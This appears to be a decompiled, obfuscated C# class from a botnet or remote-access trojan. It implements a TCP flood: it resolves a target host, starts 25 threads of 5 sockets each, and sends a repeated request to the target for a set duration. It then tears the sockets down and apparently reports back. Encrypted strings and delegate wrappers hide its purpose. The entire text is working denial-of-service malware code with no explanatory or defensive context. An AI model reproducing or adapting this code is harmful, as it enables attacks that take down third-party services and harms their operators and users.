using System.Net;
using System.Net.Sockets;
using System.Threading;

internal class Class7
{
	public static string string_0;

	public static int int_0;

	public static int int_1;

	public static int int_2 = 25;

	public static int int_3 = 5;

	private static IPEndPoint ipendPoint_0;

	private static ThreadStart[] threadStart_0;

	private static Thread[] thread_0;

	public static bool bool_0 = false;

	public static void smethod_0()
	{
		Thread object_ = Delegate113.smethod_0(smethod_1);
		Delegate114.smethod_0(object_, bool_0: true);
		Delegate115.smethod_0(object_);
	}

	private static void smethod_1()
	{
		try
		{
			ipendPoint_0 = Delegate118.smethod_0(Delegate117.smethod_0(Delegate116.smethod_0(string_0))[0], int_0);
		}
		catch
		{
			ipendPoint_0 = Delegate118.smethod_0(Delegate119.smethod_0(string_0), int_0);
		}
		thread_0 = new Thread[int_2];
		threadStart_0 = new ThreadStart[int_2];
		for (int i = 0; i < int_2; i++)
		{
			threadStart_0[i] = smethod_3;
			thread_0[i] = Delegate113.smethod_0(threadStart_0[i]);
			Delegate115.smethod_0(thread_0[i]);
		}
		Delegate82.smethod_2(int_1 * 1000);
		if (bool_0)
		{
			Delegate65.smethod_3();
			Delegate64.smethod_3(Delegate80.smethod_0(new string[5]
			{
				(string)_003CModule_003E.smethod_0(3512749845u),
				Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(3512749279u), string_0)),
				(string)_003CModule_003E.smethod_0(3512749693u),
				Delegate59.smethod_1(Delegate110.smethod_0((string)_003CModule_003E.smethod_0(3512749279u), int_1)),
				(string)_003CModule_003E.smethod_0(3512749702u)
			}), Delegate70.smethod_4());
		}
	}

	public static void smethod_2()
	{
		bool_0 = false;
	}

	private static void smethod_3()
	{
		try
		{
			string text = (string)_003CModule_003E.smethod_0(75099991u);
			string text2 = Delegate120.smethod_0(text, string_0, (string)_003CModule_003E.smethod_0(75099915u));
			byte[] array = Delegate101.smethod_0(Delegate100.smethod_0(), text2);
			Socket[] array2 = new Socket[int_3];
			for (int i = 0; i < int_3; i++)
			{
				array2[i] = Delegate122.smethod_0(Delegate121.smethod_0(ipendPoint_0), SocketType.Stream, ProtocolType.Tcp);
			}
			while (bool_0)
			{
				Socket[] array3 = array2;
				foreach (Socket object_ in array3)
				{
					if (!Delegate123.smethod_0(object_))
					{
						try
						{
							Delegate125.smethod_0(object_, Delegate124.smethod_0(ipendPoint_0), int_0);
						}
						catch
						{
						}
					}
					else
					{
						try
						{
							Delegate126.smethod_0(object_, array, array.Length, SocketFlags.None);
						}
						catch
						{
						}
					}
				}
				Delegate82.smethod_2(1);
			}
			Socket[] array4 = array2;
			foreach (Socket object_2 in array4)
			{
				Delegate127.smethod_0(object_2, SocketShutdown.Both);
				Delegate128.smethod_0(object_2);
			}
		}
		catch
		{
		}
	}
}
